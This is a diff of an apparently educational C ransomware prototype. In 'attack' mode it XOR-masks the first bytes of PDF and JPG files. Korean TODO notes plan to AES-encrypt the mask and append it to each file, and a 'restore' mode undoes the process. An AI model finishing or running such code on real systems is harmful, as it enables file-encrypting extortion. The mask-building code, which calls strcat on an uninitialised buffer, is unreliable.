@@ -44,20 +44,6 @@ void readFileList();
 static __thread int processed_pdf_count = 0;
 static __thread int processed_jpg_count = 0;
 
-static char *rand_string(char *str, size_t size) {
-  const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
-  if (size) {
-    --size;
-    for (size_t n = 0; n < size; n++) {
-      int key = rand() % (int)(sizeof(charset) - 1);
-      str[n] = charset[key];
-    }
-    str[size] = '\0';
-  }
-  printf("%s\n", str);  // debug
-  return str;
-}
-
 void *encryption_pdfs(void *param);
 
 void *encryption_jpgs(void *param);
@@ -78,21 +64,6 @@ int main(int argc, char *argv[]) {
                    // name into each string array "pdfList" and "jpgList"
                    // depending on its filetype
 
-  // debug
-  printf("pdfs: %d, jpgs: %d\n", pdfFileCount, jpgFileCount);
-
-  // debug
-  printf("=== pdfFile ===\n");
-  for (int i = 0; i < pdfFileCount; i++) {
-    printf("%s\n", pdfList[i]);
-  }
-
-  // debug
-  printf("=== jpgFile ===\n");
-  for (int i = 0; i < jpgFileCount; i++) {
-    printf("%s\n", jpgList[i]);
-  }
-
   // making threads and run them
   pthread_t pdfHandleThread;
   pthread_attr_t pdfHandleThreadStatus;
@@ -102,7 +73,7 @@ int main(int argc, char *argv[]) {
   pthread_attr_t jpgHandleThreadStatus;
   pthread_attr_init(&jpgHandleThreadStatus);
 
-  if (strcmp(fileHandleMode, "attack")) {
+  if (strcmp(fileHandleMode, "attack") == 0) {
     pthread_create(&pdfHandleThread, &pdfHandleThreadStatus, encryption_pdfs,
                    NULL);
     pthread_join(pdfHandleThread, NULL);
@@ -111,7 +82,7 @@ int main(int argc, char *argv[]) {
                    NULL);
     pthread_join(jpgHandleThread, NULL);
 
-  } else if (strcmp(fileHandleMode, "restore")) {
+  } else if (strcmp(fileHandleMode, "restore") == 0) {
     pthread_create(&pdfHandleThread, &pdfHandleThreadStatus, decryption_pdfs,
                    NULL);
     pthread_join(pdfHandleThread, NULL);
@@ -163,7 +134,7 @@ void readFileList() {
     return;
   } else {
     while (fscanf(pipe, "%s", fileItem) > 0) {
-      // when fileCount exceeds maximum index of directoryItem array, then
+      // when fileCount exceeds maximum index of fileItem array, then
       // escape the loop statement.
       if (pdfFileCount >= MAX_FILE_AMOUNT || jpgFileCount >= MAX_FILE_AMOUNT) {
         break;
@@ -218,26 +189,44 @@ void *encryption_pdfs(void *param) {
     // check plainText size is 16 or not.
     // if the size is less than 16, then give it zero padding.
     if (plainTextStringSize == FILE_HANDLE_BLOCK_SIZE) {
-      printf("%s\n", plainText);  // debug
+      printf("plainText: %s\n", plainText);  // debug
     } else if (plainTextStringSize >= 0) {
       // give plainText zero padding
       for (int i = 0; i < FILE_HANDLE_BLOCK_SIZE - plainTextStringSize; i++) {
         strcat(plainText, "0");
       }
-      printf("%s\n", plainText);  // debug
+      printf("plainText: %s\n", plainText);  // debug
     } else {
       perror("File read failure");  // exception
     }
 
-    printf("%d %ld\n", plainTextSize, strlen(plainText));  // debug
+    // generate mask randomly
+    char *mask = (char *)malloc(sizeof(char) * FILE_HANDLE_BLOCK_SIZE);
+    char segment[2] = {
+        0,
+    };
+    for (int i = 0; i < FILE_HANDLE_BLOCK_SIZE; i++) {
+      segment[0] = (unsigned char)rand();
+      strcat(mask, segment);
+      memset(segment, 0, 2);
+    }
+    printf("mask: %s / length: %ld\n", mask, strlen(mask));  // debug
 
     // do XOR calculation on plainText with randomly generated mask
-    char *mask = (char *)malloc(sizeof(char) * FILE_HANDLE_BLOCK_SIZE);
-    mask = rand_string(mask, FILE_HANDLE_BLOCK_SIZE);
+    char cipherText[FILE_HANDLE_BLOCK_SIZE] = {
+        0,
+    };
+    printf("cipherText: ");  // debug
+    for (int i = 0; i < FILE_HANDLE_BLOCK_SIZE; i++) {
+      cipherText[i] = plainText[i] ^ mask[i];
+      printf("%c", cipherText[i]);  // debug
+    }
+    printf("\n");
 
     // 11/2 (수) 할 일
     // 1. 무작위 생성한 16바이트짜리 mask 생성 후 XOR 연산하여 cipherText
     // 생성하여 덮어쓰기
+
     // 2. mask는 AES-128 암호화하여 파일의 맨 뒷 부분에 붙이기
     // (파일 포인터 새로 만들고, 이때 모드는 wba로 하여 fwrite 연산하기)
 
@@ -246,6 +235,7 @@ void *encryption_pdfs(void *param) {
     // 5. 평문 mask를 cipherText와 XOR 연산하여 plainText 얻고, 이를 맨 앞
     // 16바이트에 덮어쓰기
 
+    free(mask);
     free(plainText);
     fclose(fp);
     free(fileDir);
@@ -270,19 +260,30 @@ void *encryption_jpgs(void *param) {
     // check plainText size is 16 or not.
     // if the size is less than 16, then give it zero padding.
     if (plainTextStringSize == FILE_HANDLE_BLOCK_SIZE) {
-      printf("%s\n", plainText);  // debug
+      printf("plainText: %s\n", plainText);  // debug
     } else if (plainTextStringSize >= 0) {
       // give plainText zero padding
       for (int i = 0; i < FILE_HANDLE_BLOCK_SIZE - plainTextStringSize; i++) {
         strcat(plainText, "0");
       }
-      printf("%s\n", plainText);  // debug
+      printf("plainText: %s\n", plainText);  // debug
     } else {
       perror("File read failure");  // exception
     }
 
-    printf("%d %ld\n", plainTextSize, strlen(plainText));  // debug
+    // do XOR calculation on plainText with randomly generated mask
+    char *mask = (char *)malloc(sizeof(char) * FILE_HANDLE_BLOCK_SIZE);
+    char segment[2] = {
+        0,
+    };
+    for (int i = 0; i < FILE_HANDLE_BLOCK_SIZE; i++) {
+      segment[0] = (unsigned char)rand();
+      strcat(mask, segment);
+      memset(segment, 0, 2);
+    }
+    printf("mask: %s / length: %ld\n", mask, strlen(mask));  // debug
 
+    free(mask);
     free(plainText);
     fclose(fp);
     free(fileDir);
@@ -318,8 +319,6 @@ void *decryption_pdfs(void *param) {
       perror("File read failure");  // exception
     }
 
-    printf("%d %ld\n", plainTextSize, strlen(plainText));  // debug
-
     free(plainText);
     fclose(fp);
     free(fileDir);
@@ -354,8 +353,6 @@ void *decryption_jpgs(void *param) {
     } else {
       perror("File read failure");  // exception
     }
-
-    printf("%d %ld\n", plainTextSize, strlen(plainText));  // debug
 
     free(plainText);
     fclose(fp);
